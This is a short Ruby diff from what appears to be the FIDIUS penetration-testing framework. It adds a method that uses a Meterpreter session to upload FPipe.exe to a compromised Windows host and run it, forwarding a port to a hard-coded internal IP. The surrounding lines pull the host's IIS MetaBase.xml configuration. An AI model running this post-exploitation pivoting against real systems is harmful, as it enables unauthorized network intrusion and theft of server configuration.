@@ -25,6 +25,15 @@ module FIDIUS
         analyzeConfig tmpDown("#{Dir.pwd}", "#{iis_path}\\MetaBase.xml") if iis_running
       end
 
+      def establishPortFwd
+        script_path = Msf::Sessions::Meterpreter.find_script_path("uploadexec")
+        #FIXME Hartgecoded IP
+        #args = ['-e',"#{RAILS_ROOT}/vendor/FPipe.exe", '-o', "-l 3000 -r 3000 #{@pwnlink[0,@pwnlink.rindex(':')]}", lhost]
+        args = ['-e',"#{RAILS_ROOT}/vendor/FPipe.exe",'-p','C:\\', '-o', "-l 8081 -r 8080 192.168.178.22"]
+        puts "run: #{script_path} #{args}"
+        @session.execute_file(script_path, args)
+      end
+
       def analyzeConfig config_path = ""
         config = File.readlines config_path
         tmp_path_array = []
